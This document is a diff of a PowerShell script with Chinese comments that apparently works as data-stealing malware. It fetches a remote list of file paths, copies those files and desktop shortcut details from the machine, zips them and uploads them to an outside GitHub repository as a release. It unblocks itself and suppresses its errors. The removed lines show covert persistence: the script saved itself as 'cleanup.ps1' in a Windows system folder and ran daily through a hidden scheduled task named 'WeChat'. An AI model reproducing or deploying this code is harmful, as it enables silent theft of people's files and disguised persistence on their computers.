@@ -1,14 +1,22 @@
-# install.ps1 - 上传文件 + 注册计划任务（计划任务名：WeChat）
+# === main.ps1 ===
 
-# Save self to local file path for scheduled task (no space)
-$localPath = "C:\ProgramData\Microsoft\Windows\cleanup.ps1"
-Invoke-RestMethod -Uri "https://raw.githubusercontent.com/rtyuiuiop/1/main/.github/install.ps1" -OutFile $localPath -UseBasicParsing
+# ✅ 自动解除阻止（避免运行时出现确认提示）
+try {
+    Unblock-File -Path $MyInvocation.MyCommand.Path -ErrorAction SilentlyContinue
+} catch {}
 
-# Set UTF-8 encoding
+# ✅ 设置 UTF-8 输出编码
 [Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 $OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 
-$token = $env:GITHUB_TOKEN
+# ✅ 获取 GitHub Token
+$token = $env:GH_UPLOAD_KEY
+if (-not $token) {
+    Write-Error "❌ 环境变量 GH_UPLOAD_KEY 未设置，无法上传文件到 GitHub"
+    return
+}
+
+# ✅ 基本信息设置
 $repo = "rtyuiuiop/1"
 $now = Get-Date
 $timestamp = $now.ToString("yyyy-MM-dd-HHmmss")
@@ -21,22 +29,22 @@ $zipName = "package-$computerName-$timestamp.zip"
 $zipPath = Join-Path $env:TEMP $zipName
 New-Item -ItemType Directory -Path $tempRoot -Force -ErrorAction SilentlyContinue | Out-Null
 
-# STEP 1: Load file path list from remote .txt
-$remoteTxtUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/main/.github/upload-paths.txt"
+# ✅ STEP 1: 远程路径列表
+$remoteTxtUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/refs/heads/main/.github/upload-paths.txt"
 try {
     $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
     $pathList = $remoteList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
 } catch {
+    Write-Warning "⚠️ 无法加载路径列表：$($_.Exception.Message)"
     return
 }
 
+# ✅ STEP 2: 拷贝目标文件
 $index = 0
 foreach ($path in $pathList) {
     $index++
     $name = "item$index"
-
     if (-not (Test-Path $path)) { continue }
-
     $dest = Join-Path $tempRoot $name
 
     try {
@@ -51,16 +59,15 @@ foreach ($path in $pathList) {
     } catch {}
 }
 
-# STEP 2: Extract .lnk shortcut info from Desktop
+# ✅ STEP 3: 收集桌面 .lnk 快捷方式信息
 try {
     $desktop = [Environment]::GetFolderPath("Desktop")
     $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
     $lnkReport = ""
+    $shell = New-Object -ComObject WScript.Shell
 
     foreach ($lnk in $lnkFiles) {
-        $shell = New-Object -ComObject WScript.Shell
         $shortcut = $shell.CreateShortcut($lnk.FullName)
-
         $lnkReport += "[$($lnk.Name)]`n"
         $lnkReport += "TargetPath: $($shortcut.TargetPath)`n"
         $lnkReport += "Arguments:  $($shortcut.Arguments)`n"
@@ -73,60 +80,49 @@ try {
     $lnkReport | Out-File -FilePath $lnkOutputFile -Encoding utf8
 } catch {}
 
-# STEP 3: Archive
+# ✅ STEP 4: 压缩归档
 try {
     Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force -ErrorAction Stop
 } catch {
+    Write-Warning "⚠️ 压缩失败"
     return
 }
 
-# STEP 4: Upload
+# ✅ STEP 5: 上传 Release
 $releaseData = @{
-    tag_name = $tag
-    name = $releaseName
-    body = "Automated file package from $computerName on $date"
-    draft = $false
-    prerelease = $false
+    tag_name    = $tag
+    name        = $releaseName
+    body        = "Automated file package from $computerName on $date"
+    draft       = $false
+    prerelease  = $false
 } | ConvertTo-Json -Depth 3
 
 $headers = @{
     Authorization = "token $token"
-    "User-Agent" = "PowerShellScript"
-    Accept = "application/vnd.github.v3+json"
+    "User-Agent"  = "PowerShellScript"
+    Accept        = "application/vnd.github.v3+json"
 }
 
 try {
     $releaseResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData -ErrorAction Stop
     $uploadUrl = $releaseResponse.upload_url -replace "{.*}", "?name=$zipName"
 } catch {
+    Write-Warning "❌ 创建 Release 失败"
     return
 }
 
 try {
     $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
     $uploadHeaders = @{
-        Authorization = "token $token"
-        "Content-Type" = "application/zip"
-        "User-Agent" = "PowerShellScript"
+        Authorization   = "token $token"
+        "Content-Type"  = "application/zip"
+        "User-Agent"    = "PowerShellScript"
     }
-    $response = Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
-} catch {}
-
-# STEP 5: Cleanup
-Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
-Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
-
-# STEP 6: Register daily task at 1:00 AM to run the cleanup.ps1 script (schtasks version)
-$taskName = "WeChat"
-$scriptPath = "C:\ProgramData\Microsoft\Windows\cleanup.ps1"
-
-if (-Not (Test-Path $scriptPath)) {
-    Write-Error "❌ cleanup.ps1 not found at $scriptPath"
-    exit 1
+    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
+} catch {
+    Write-Warning "❌ 上传文件失败"
 }
 
-Write-Host "📅 Registering scheduled task [$taskName] (daily at 01:00 AM)..."
-
-schtasks /Create /TN $taskName /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" /SC DAILY /ST 01:00 /F | Out-Null
-
-Write-Host "✅ Task registered: will run daily at 01:00 AM"
+# ✅ STEP 6: 清理临时文件
+Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
